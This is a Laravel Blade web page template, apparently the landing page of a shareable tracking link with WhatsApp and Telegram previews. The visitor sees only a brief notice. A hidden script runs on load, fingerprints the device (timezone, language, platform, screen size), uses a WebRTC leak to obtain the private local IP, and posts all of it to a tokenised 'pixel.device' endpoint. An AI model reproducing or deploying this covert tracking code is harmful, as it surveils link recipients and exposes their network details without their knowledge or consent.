<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $ogTitulo }}</title>

    {{-- Open Graph: preview automático no WhatsApp/Telegram --}}
    <meta property="og:type"        content="website">
    <meta property="og:title"       content="{{ $ogTitulo }}">
    <meta property="og:description" content="{{ $ogDescricao }}">
    @if($ogImagem)
    <meta property="og:image"       content="{{ $ogImagem }}">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    @endif
    <meta property="og:url"         content="{{ url()->current() }}">
    <meta name="twitter:card"       content="summary_large_image">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f3f4f6;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #374151;
        }
        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,.08);
            padding: 48px 40px;
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .icon {
            width: 56px;
            height: 56px;
            background: #fef3c7;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }
        .icon svg { width: 28px; height: 28px; stroke: #d97706; }
        h1 { font-size: 1.1rem; font-weight: 600; color: #111827; margin-bottom: 8px; }
        p  { font-size: 0.9rem; color: #6b7280; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round"
                    d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
            </svg>
        </div>
        <h1>{{ $mensagem }}</h1>
        <p>Caso precise de suporte, entre em contato com o remetente.</p>
    </div>

    <script>
    (function () {
        var token    = @json($token);
        var endpoint = @json(route('pixel.device', ':token')).replace(':token', token);
        var csrf     = @json(csrf_token());

        var dados = {
            // Timezone e GMT real do dispositivo
            gmt:       '',
            // IP local via WebRTC
            ip_local:  null,
            // Fingerprint básico
            idioma:    navigator.language || navigator.userLanguage || '',
            plataforma: navigator.userAgentData
                            ? (navigator.userAgentData.platform || navigator.platform || '')
                            : (navigator.platform || ''),
            resolucao: screen.width + 'x' + screen.height,
        };

        // GMT real
        try {
            var tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
            var offset = new Date().getTimezoneOffset();
            var h      = Math.floor(Math.abs(offset) / 60);
            var m      = Math.abs(offset) % 60;
            var s      = offset <= 0 ? '+' : '-';
            dados.gmt  = 'GMT' + s + String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ' (' + tz + ')';
        } catch(e) {}

        // IP local via WebRTC
        function enviar(ip) {
            if (ip) dados.ip_local = ip;
            fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf },
                body: JSON.stringify(dados)
            }).catch(function(){});
        }

        try {
            var RTCPeer = window.RTCPeerConnection
                       || window.webkitRTCPeerConnection
                       || window.mozRTCPeerConnection;

            if (!RTCPeer) { enviar(null); return; }

            var pc = new RTCPeer({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');

            var ipEncontrado = false;
            pc.onicecandidate = function(e) {
                if (!e || !e.candidate || !e.candidate.candidate) {
                    if (!ipEncontrado) enviar(null);
                    return;
                }
                // Extrair IP do candidate SDP
                var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/.exec(
                    e.candidate.candidate
                );
                if (match && !ipEncontrado) {
                    var ip = match[1];
                    // Ignorar IPs públicos (queremos apenas o IP privado/local)
                    if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|fd|fc)/.test(ip)) {
                        ipEncontrado = true;
                        pc.close();
                        enviar(ip);
                    }
                }
            };

            pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); }).catch(function(){});

            // Timeout de segurança: enviar sem IP local após 4s
            setTimeout(function() { if (!ipEncontrado) { pc.close(); enviar(null); } }, 4000);

        } catch(e) {
            enviar(null);
        }
    })();
    </script>
</body>
</html>
